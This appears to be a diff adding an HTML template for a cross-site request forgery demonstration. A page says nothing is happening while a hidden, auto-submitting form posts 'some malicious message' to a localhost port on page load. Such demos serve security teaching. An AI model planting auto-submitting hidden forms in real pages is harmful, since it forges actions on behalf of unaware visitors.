@@ -1,0 +1,15 @@
+
+  <div class="flex flex-col items-center justify-center bg-yellow-100">
+   
+    <p>
+      Nothing fishy happening over on <strong>Port {{port}}</strong>. Move
+      along.
+    </p>
+    <form id="do-fake-post" method="POST" action="http://localhost:{{port}}/posts" class="opacity-0">
+      <input type="text" name="content" value="some malicious message">
+    <form>
+    <script>
+      document.getElementById('do-fake-post').submit();
+    </script>
+  </div>
+
